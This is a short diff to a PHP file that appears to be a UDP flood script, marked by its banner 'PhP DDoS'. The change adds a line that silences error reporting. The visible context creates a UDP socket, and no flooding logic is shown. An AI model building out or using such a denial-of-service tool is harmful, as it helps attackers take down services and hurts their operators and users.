@@ -1,4 +1,5 @@
 <?php
+error_reporting(-0);
 $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
 
 echo "Script By JeanLeKhey | PhP DDoS";
